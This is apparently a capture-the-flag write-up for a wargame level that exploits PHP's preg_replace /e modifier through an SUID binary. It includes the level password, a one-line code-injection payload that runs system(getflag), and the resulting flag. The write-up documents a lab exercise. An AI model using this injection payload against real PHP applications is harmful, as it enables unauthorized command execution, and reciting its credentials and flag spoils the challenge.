username: level06  
password: viuaaale9huek52boumoomioc
---

`level06` has SUID bit set, it executes `level06.php` with a filename as argument.

`level06.php` uses `preg_replace` with `/e` which allow us to call a function when a regex match.

Executing the following command outputs the flag

```
echo '[x {${system(getflag)}}]' > /tmp/a && ./level06 /tmp/a 2>/dev/null
```

The flag is: wiok45aaoguiboiki2tuin6ub
